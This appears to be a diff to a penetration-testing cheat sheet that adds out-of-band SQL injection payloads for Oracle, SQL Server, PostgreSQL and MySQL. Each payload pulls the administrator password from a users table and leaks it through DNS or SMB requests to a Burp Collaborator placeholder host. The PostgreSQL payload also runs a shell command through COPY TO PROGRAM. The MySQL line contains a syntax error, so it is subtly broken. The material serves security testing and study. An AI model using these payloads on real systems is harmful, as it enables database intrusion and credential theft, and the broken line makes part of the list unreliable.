@@ -317,3 +317,33 @@ for idx in range(self.len_password):
 	</stockCheck>
 ```
 
+### Out-of-Bound SQL Injection
+**List Payload** :
+Oracle :
+```sql
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
+```
+
+Microsoft :
+```sql
+declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='administrator');exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
+```
+
+PostgreSQL
+```sql
+create OR replace function f() returns void as $$  
+declare c text;  
+declare p text;  
+begin  
+SELECT into p (SELECT password FROM users WHERE username='administrator');  
+c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';  
+execute c;  
+END;  
+$$ language plpgsql security definer;  
+SELECT f();
+```
+
+MySQL
+```sql
+SELECT SELECT password FROM users WHERE username='administrator' INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
+```
